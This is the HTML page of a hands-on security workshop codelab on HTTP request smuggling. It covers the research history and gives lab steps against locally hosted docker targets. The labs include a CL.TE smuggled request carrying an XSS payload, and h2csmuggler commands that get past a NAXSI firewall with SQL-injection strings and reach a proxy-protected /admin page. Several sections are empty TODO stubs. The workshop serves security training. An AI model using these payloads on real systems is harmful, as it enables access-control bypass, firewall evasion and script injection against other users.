
<!doctype html>

<html>
<head>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
  <meta name="theme-color" content="#4F7DC9">
  <meta charset="UTF-8">
  <title>Introduction to Request Smuggling</title>
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
  <style>
    .success {
      color: #1e8e3e;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
  <google-codelab codelab-gaid="UA-153352998-3"
                  id="request-smuggling-workshop"
                  title="Introduction to Request Smuggling"
                  environment="web"
                  feedback-link="https://github.com/GoSecure/request-smuggling-workshop/issues">
    
      <google-codelab-step label="Introduction" duration="5">
        <p>Welcome to the workshop segment of this presention on Request Smuggling. Now is the time to put the theory discussed into practice.</p>
<p>At the end of the workshop, you will be familiar with four attack variants of HTTP Request Smuggling. You will also have a test environment to experiment further with the attack. All the custom applications and system configurations are open source.</p>
<h2 is-upgraded>Requirements</h2>
<p>The only requirement is to have an HTTP interception proxy installed. BurpSuite is the only recommended for its support for HTTP2.</p>
<ul>
<li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
</ul>
<h2 is-upgraded>Running the applications</h2>
<p>In order to do the exercise, you will need to run the <a href="https://github.com/GoSecure/request-smuggling-workshop" target="_blank">lab applications</a> by yourself. All applications were built with a docker container recipe. This should make the deployment easier.</p>
<ol type="1">
<li>Download the code. <br><code>$ git clone https://github.com/GoSecure/request-smuggling-workshop<br></code></li>
<li>Read build instructions (<code>/README.md</code>) from each application. This step will differ for each application.</li>
<li>Use docker-compose to start the application. <br><code>$ docker-compose up<br></code></li>
</ol>
<h2 is-upgraded>Optional DNS configuration</h2>
<p>In order to make the links work, you can optionally add an entry to your local host file. (<code>/etc/hosts</code> or <code>C:\Windows\system32\drivers\etc\hosts</code>)</p>
<pre><code>127.0.0.1   request-smuggling.gosec.co
</code></pre>
<h2 is-upgraded>Video presentation</h2>
<p>You can watch the complete workshop on video. From the video, you will be able to listen to all the tutorials and see the demonstrations for all exercises. Open the <a href="https://youtu.be/XXXXXXXXXXXXX" target="_blank">YouTube page in a new window</a> to see the chapters.</p>
<p>TODO: Replace with video.</p>


      </google-codelab-step>
    
      <google-codelab-step label="Intro: HTTP Tunneling" duration="0">
        <h2 is-upgraded>HTTP protocol evolution key changes</h2>
<p>In early version of HTTP (version 1.0 and before), every request is one TCP connection. This method was enough to support simple HTML websites. However, a sophisticated website This generate numerous TCP handshakes</p>
<ul>
<li>No connection pool possible</li>
<li>HTTP/1.1 uses by default persistent connections  <ul>
<li>Introduce Transfer-Encoding header</li>
</ul>
</li>
</ul>
<p class="image-container"><img alt="HTTP Pipeline" src="img\\7ff6991267f25526.png"></p>
<h2 is-upgraded>Multiple requests in the same TCP socket</h2>
<p>When a client is requesting multiples resources (Javascript, Images, Pages, Ajax requests), requests can follow each other in the same TCP socket. The outgoing stream would look like the code below.</p>
<pre><code>GET /index.php HTTP/1.1
Host: myapp.com
Content-Length: 0

POST /login HTTP/1.1
Host: myapp.com
Content-Length: 33

username=admin&amp;password=i&lt;3intent
GET /logo.gif HTTP/1.1
Host: myapp.com
Content-Length: 0
</code></pre>
<p>How does the server knows where a request ends and a new request starts? Easy. A request is made up of a header section and a body section. The headers can have any lenght and are terminated by <code>\r\n</code>. The body section has variable length. In the previous outgoing stream, the server can determine the size of the body section using the <code>Content-Length</code> header.</p>
<h2 is-upgraded>Where is the confusion?</h2>
<p>Confusion appears when the proxy and the backend server do not agree on the size of each request. This is because these systems may have HTTP parsers which have a slightly different implementation. As soon as a parser is more flexible when implementing the protocol, it can potentially be abuse.</p>
<p>In a typical scalable web infrastructure, a proxy will place in front of the backend. The proxy is forwarding request to the backend with the intent to add functionnality such as caching, firewall or load balancing.</p>
<p class="image-container"><img alt="Proxy Backend Infrastructure" src="img\\217b540954d553d9.png"></p>


      </google-codelab-step>
    
      <google-codelab-step label="Intro: Smuggling Variants" duration="0">
        <p>The research on HRS has evolve over the past 15 years. While this vulnerability class is not exactly new, most of the development on the topic happen from 2019 to 2021.</p>
<h2 is-upgraded>Key researchs</h2>
<h3 is-upgraded>2004: <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf" target="_blank">HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</a></h3>
<p><em>by Amit Klein</em></p>
<p>This first paper demonstrate the impact of desynchronizing response in an HTTP stream. While this is not Request Smuggling per say, it has very similar effects and impacts.</p>
<h3 is-upgraded>2005: Watchfire Paper: <a href="https://doc.lagout.org/Others/EN-HTTP-Request-Smuggling.pdf" target="_blank">HTTP request smuggling</a></h3>
<p><em>by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin</em></p>
<p>The &#34;HTTP Request Smuggling&#34; paper was the first to document the impacts of desynchronizing the HTTP pipeline. Those impact include Web Cache Poisoning, Firewall/IPS/IDS evaion, Request Hijacking and Request Credential Hijacking.</p>
<h2 is-upgraded>2016: Presentation <a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank">Hiding Wookiees in HTTP</a></h2>
<p>by Regis Leroy (@regilero)</p>
<p>Multiples new variants were presented</p>
<h2 is-upgraded>2019: <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">HTTP Desync Attacks: Request Smuggling Reborn</a></h2>
<p><em>by James Kettle</em></p>
<p>TODO</p>
<h2 is-upgraded>2019: <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a></h2>
<p><em>by Mikhail Egorov (@0ang3el)</em></p>
<p>This research introduce a very different approach to request smuggling. It does not involve a complete desynchronisation of HTTP tunneling. Instead, it hides an HTTP/1.1 request inside - what appears to the proxy - a valid websocket stream.</p>
<h2 is-upgraded>2020: <a href="https://bishopfox.com/blog/h2c-smuggling-request" target="_blank">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</a></h2>
<p><em>by Jake Miller (@theBumbleSec)</em></p>
<p>Inspired by the WebSocket technique, Jake Miller found a new variant that abuse the capabilities of some backend application to support HTTP2 Cleartext procotol. This mode is started as a HTTP/1 over TLS. It then switch to a HTTP/2 after an upgrade request similar to the one use in WebSocket communication.</p>
<h2 is-upgraded>2021: <a href="https://portswigger.net/research/http2" target="_blank">HTTP/2: The Sequel is Always Worse</a></h2>
<p><em>by James Kettle</em></p>
<p>This latest development introduce implementation mistakes from proxy that proxy from HTTP/2 to HTTP/1. The support for TLS or HTTP2 is often delegate to the load balancer. This facilitate the deployment of web applications. If the web application containers (NodeJS, .NET core, Jetty, Tomcat, etc) does not support HTTP/2, the proxy needs to convert HTTP/2 request headers to the HTTP/1 procotol. This conversion is subject to error if the HTTP/2 are not validate strictly.</p>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/1.1 CL.CL" duration="0">
        <h2 is-upgraded>Duplicate Content-Length</h2>
<p>The first edge case that was documented was the use of two <code>Content-Length</code> headers with conflicting values. This cause issue when the proxy and the backend do not use the same value. How can this be possible? Because the parser are implemented differently, implementation might keep the state of each header in a map and the behavior when a duplicate header is seen will differ.</p>
<p><em>Implementation where the last value is kept</em></p>
<pre><code language="language-python" class="language-python">headers = {}
for line : httpRequest
    parts = line.split(&#34;:&#34;)
    headers[parts[0]] = parts[1]
</code></pre>
<p><em>Implementation where the first value is kept</em></p>
<pre><code language="language-python" class="language-python">headers = {}
for line : httpRequest
    parts = line.split(&#34;:&#34;)
    if(parts[0] in headers): #Does not override existing value
        headers[parts[0]] = parts[1]
</code></pre>
<h2 is-upgraded>What each party sees in a CL.CL attack</h2>
<p>The proxy <strong>use the first</strong> header:</p>
<p class="image-container"><img alt="HRS: Sees first Content-Length" src="img\\c1f562fb1c053265.png"></p>
<p>The backend application <strong>use the last</strong> header:</p>
<p class="image-container"><img alt="HRS: Sees last Content-Length" src="img\\eac5cef1b0e1aa11.png"></p>
<h2 is-upgraded>Cache poisoning</h2>
<p>In the diagram below, we can see that proxy is not interpreting the correct resource served by the web application.</p>
<p class="image-container"><img alt="Cache poisoning" src="img\\2c39fbd6b3252fe1.png"></p>
<h2 is-upgraded>Their is more...</h2>
<p>This scenario is probably the easiest to understand. This is why it was presented first. However, the length of request is <strong>not defined only by </strong></p>
<p><strong><code>Content-Length</code></strong>. HTTP has evolve greatly and has multiple headers that cover similar feature.</p>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/1.1 CL.TE" duration="0">
        

      </google-codelab-step>
    
      <google-codelab-step label="LAB 1: HTTP/1.1 CL.TE" duration="0">
        <p>Open <code>http://simplewebsite.gosec.co</code> in a browser to confirm that everything is running.</p>
<h2 is-upgraded>HRS detection</h2>
<p>The following request need to repeated ~10 times until you get <code>405 Not Allowed</code> (Method not allowed)</p>
<pre><code>POST / HTTP/1.1
Host: simplewebsite.gosec.co
Content-Length: 79
Transfer-Encoding: chunked

0

G
</code></pre>
<aside class="warning"><p>We need to repeat the following request multiple times. It is a</p>
</aside>
<h2 is-upgraded>Finding a XSS vector</h2>
<p>There are two main vectors to execute Javascript on</p>
<p>Injecting an HTTP request in the proxy pipeline.</p>
<pre><code>POST / HTTP/1.1
Host: simplewebsite.gosec.co
Content-Length: 79
Transfer-Encoding: chunked

0

GET /contact.php?test=123&#34;&gt;&lt;img/src=&#34;xx&#34;onerror=&#34;alert(1)&#34;&gt; HTTP/1.1
Foo:
</code></pre>
<p>Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request. You should see the XSS trigger.</p>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 2: HTTP/2 (TODO)" duration="0">
        

      </google-codelab-step>
    
      <google-codelab-step label="WebSocket HRS" duration="0">
        <h2 is-upgraded>Web Socket in a nutshell</h2>
<p>WebSocket communication is full-duplex communication that takes places inside a HTTP/1. While typical HTTP/1 messages can be sent in full-duplex, classic HTTP require all messages to have a headers and body section. WebSocket allows minimalist communication along with the control over the Socket with Javascript.</p>
<p>TODO: Screenshot wireshark</p>
<p class="image-container"><img alt="h2c sequence diagram" src="img\\831e0a0bd13d2ca8.png"></p>
<h2 is-upgraded>Request Smuggling oppotunity</h2>
<p>It would not be possible to pass an HTTP/1 request once the WebSocket protocol has been establish. Once the upgrade is done the receiving application will see incoming traffic as bytes. (Add note regarding encryption)</p>
<p>It is however possible to initiate an incomplete Upgrade request that would fail. If the proxy has a &#34;naive&#34; WebSocket support implementation, it will not at the server response to evaluate if the upgrade succeed. Using this request failure, it is now possible to pass additional request to the server. Since it is not in WebSocket mode, it will process the following byte stream as normal HTTP/1.</p>
<p>TODO: Maybe WebSocket diagram</p>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a> by 0ang3el</li>
</ul>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 3: WebSocket" duration="0">
        

      </google-codelab-step>
    
      <google-codelab-step label="HTTP/4 Upgrade to HTTP/2 cleartext" duration="0">
        <p>HTTP 2 Cleartext, shorten to h2c, is the protocol upgrade a connection from HTTP version 1 to HTTP version 2. The operation is done without closing the TCP socket.</p>
<h2 is-upgraded>HTTP 2 Handshake Sequence</h2>
<p class="image-container"><img alt="h2c sequence diagram" src="img\\9c1af04a41ae7fe4.png"></p>
<h2 is-upgraded>Potential abuses</h2>
<p>Just like the technique with the WebSocket upgrade, it is possible to create request that will not analyzed by the load balancer. Any special processing such as URL filtering could be bypass.</p>
<ul>
<li>URL filtering bypass</li>
<li>WAF bypass</li>
</ul>
<p><em>References:</em></p>
<ul>
<li>https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c</li>
<li>https://blog.assetnote.io/2021/03/18/h2c-smuggling/</li>
<li>https://portswigger.net/daily-swig/h2c-smuggling-proves-effective-against-azure-cloudflare-access-and-more</li>
</ul>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext" duration="0">
        <h2 is-upgraded>Scenario 1: Bypassing WAF</h2>
<p>Visit <code>http://localhost:8001/movie_detail?id=1</code>. If you attempt to tamper the parameter <code>id</code>, you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder <em>(see impossible)</em> when a strong firewall is in place. By default, NAXSI is configured to block all quotes <code>'</code> characters. However with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall.</p>
<p>TODO: Screenshot NAXSI blocking request</p>
<h2 is-upgraded>Validation</h2>
<p>First, we need to validate that HTTP2 cleartext is supported by the backend. If the backend application does not support it, this technique will not work.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8002 can be used for tunneling
</code></pre>
<h2 is-upgraded>Exploitation</h2>
<p>When testing for SQL injection, a tester will be blocked right away by the Web Application Firewall in place.</p>
<p><code>http://127.0.0.1/movie?id=1'</code> (see single quote at the end)</p>
<p class="image-container"><img alt="NAXSI" src="img\\1720e65486903174.png"></p>
<p>We can use the HTTP2 technique to establish a HTTP tunnel with the application directly that will not be interpreted by most proxies.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 &#34;http://127.0.0.1/movie?id=1&#39;&#34;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /movie?id=1&#39;
[...]
</code></pre>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 &#34;https://127.0.0.1/?genre=action&#39; or &#39;&#39;=&#39;&#34;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /movie?id=1&#39;
[...]
</code></pre>
<h2 is-upgraded>Scenario 2: Acessing forbidden /admin page</h2>
<p>The same infrastructure to test proxy-level access bypass. The application has administrative page that is intended only for system administrator. The control is inforced by the proxy. Therefor, if one request is not interpret by the proxy, the access control will not be inforced.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8001 http://127.0.0.1/admin&#39;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /admin&#39;
[...]
</code></pre>
<p>This lab allows you to exploit the same vulnerability  on 3 proxies.</p>
<table>
<tr><td colspan="1" rowspan="1"><p>TCP port</p>
</td><td colspan="1" rowspan="1"><p>Description</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8001</p>
</td><td colspan="1" rowspan="1"><p>HAProxy -&gt; h2c backend (Insecure default configuration)</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8002</p>
</td><td colspan="1" rowspan="1"><p>nginx -&gt; h2c backend  (Insecure custom configuration)</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8003</p>
</td><td colspan="1" rowspan="1"><p>Nuster -&gt; HAProxy -&gt; h2c backend (Insecure configuration with multiple layers of proxies)</p>
</td></tr>
</table>
<p>Changing the port to 8002 and 8003 can confirm that these two others servers are also vulnerable.</p>
<aside class="special"><p>Don&#39;t forget that the second URL use the port exposed by the web application on the <em>internal network</em>. It might not be 80. You can try port such as <code>5000</code>, <code>8000</code> and <code>8080</code>.</p>
</aside>


      </google-codelab-step>
    
      <google-codelab-step label="Conclusion" duration="2">
        <p>Request Smuggling is a vulnerability that had numerous new developments in recent history. It will continues to exists as long as new variations are found and new HTTP parsers are implemented with similar mistakes.</p>
<p>If you are interested in testing your application infrastructure, <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646" target="_blank">HTTP Request Smuggler</a> seems to be the most complete test suite at the moment.</p>
<p>If you like the format of this workshop, we have produces three free workshops that can also be completed at your own paces.</p>
<p><a href="https://gosecure.github.io/xxe-workshop/" target="_blank"><img alt="XXE Workshop" src="img\\b24171361cccb5ea.png"></a> <a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/" target="_blank"><img alt="Binary Analysis Workshop" src="img\\2a5e6e709ef3d3c7.png"></a> <a href="https://gosecure.github.io/template-injection-workshop/" target="_blank"><img alt="Template Injection Workshop" src="img\\4889f8a64bc5cd91.png"></a></p>
<h2 is-upgraded>Documentation References</h2>
<ul>
<li>Watchfire Paper: <a href="https://doc.lagout.org/Others/EN-HTTP-Request-Smuggling.pdf" target="_blank">HTTP request smuggling</a> by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin</li>
<li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank">Hiding Wookiees in HTTP</a> by Regis Leroy (@regilero)</li>
<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">HTTP Desync Attacks: Request Smuggling Reborn</a> by James Kettle</li>
<li><a href="https://portswigger.net/research/http2" target="_blank">HTTP/2: The Sequel is Always Worse</a> by James Kettle</li>
<li><a href="https://bishopfox.com/blog/h2c-smuggling-request" target="_blank">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</a> by Jake Miller (@theBumbleSec)</li>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a> by Mikhail Egorov (@0ang3el)</li>
</ul>
<h2 is-upgraded>Credits for code used in the infrastructure</h2>
<p>This workshop was create based on open-source projects and samples.</p>
<ul>
<li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc5" target="_blank">Docker samples for Apache Traffic Server</a> by Regis Leroy <a href="https://twitter.com/regilero" target="_blank">@regilero</a></li>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">HRS WebSocket POC</a> by Mikhail Egorov <a href="https://twitter.com/0ang3el" target="_blank">@0ang3el</a></li>
<li><a href="https://github.com/BishopFox/h2csmuggler" target="_blank">HRS HTTP/2 Cleartext POC</a> by Jake Miller (BishopFox) <a href="https://twitter.com/thebumblesec?lang=en" target="_blank">@thebumblesec</a></li>
<li><a href="https://github.com/Netflix/zuul" target="_blank">Zuul code sample</a> by Various Zuul/Netflix Developpers</li>
</ul>


      </google-codelab-step>
    
  </google-codelab>

  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
  <script src="//support.google.com/inapp/api.js"></script>

</body>
</html>
